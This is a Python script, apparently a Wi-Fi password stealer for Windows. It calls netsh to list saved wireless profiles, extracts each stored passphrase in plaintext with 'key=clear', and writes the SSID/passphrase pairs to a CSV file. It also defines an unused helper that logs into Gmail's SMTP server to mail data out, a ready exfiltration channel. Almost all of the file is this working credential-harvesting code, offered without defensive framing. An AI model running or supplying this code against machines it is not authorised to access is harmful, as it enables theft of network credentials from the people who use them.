import subprocess
import smtplib
import csv

def sendmail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


# Send the command to get the wifi access point information.
command = ["netsh", "wlan", "show", "profile"]
wifiNodes = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
wifiNodes.wait()
output = wifiNodes.stdout.read()

# General items to look for and clean up for the wifi name list.
thingsToReplace = {'All User Profile': '', '\\r\\n': '', "'": ''}

for key, value in thingsToReplace.items():
    output = str(output).replace(key, value)

# Split by the colon, pop off the first useless bit of text.
output = output.split(' : ')
output.pop(0)

# Add the extracted wifi names to wifiList.
wifiNames = [] 
for i in output:
    i = str(i.strip())
    wifiNames.append(i)

# Acquire the passphrase for the SSIDs.
passwords = []

wifiInfoToReplace = {'\\r':' ', '\\n': ' ', "--": ''}

# Automatically issue the command to get passphrase information from the list of access point names in our fist list.
for i in wifiNames:
    command = ["netsh", "wlan", "show", "profile", "{}".format(i), "key=clear"]
    wifiInfo = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    wifiInfo.wait()
    passphrase = wifiInfo.stdout.read()

    # Clean up the new list a little bit using above dictionary.
    for key, value in wifiInfoToReplace.items():
        passphrase = str(passphrase).replace(key, value).strip()

    # Split at the colon again. There's a lot of info we don't need for now. Getting rid of all of it.
    infoList = passphrase.split(" : ")
    del infoList[1:11]

    # Add the extracted passphrases to the passphrase list, finish some minor cleaning.
    passwords.append(infoList[9].split("  ")[0].strip())

# Convert the two lists (wifiNames, passwords) into a single dictionary.
wirelessDict = dict(zip(wifiNames, passwords))

# Headers for writing to CSV.
headerList = ['SSID', 'PASSPHRASE']

# Final resting place for out access point and passphrase.
wirelessInfo = []

# Make the dictionary a list of lists so it looks good in CSV.
for key, val in wirelessDict.items():
    wirelessInfo.append([key, val])

# print(wirelessInfo)

# File handler to write to the CSV.
with open('wifiStuff.csv', 'w', encoding='UTF8', newline = '') as file:
    writer = csv.writer(file)
    writer.writerow(headerList)
    writer.writerows(wirelessInfo)
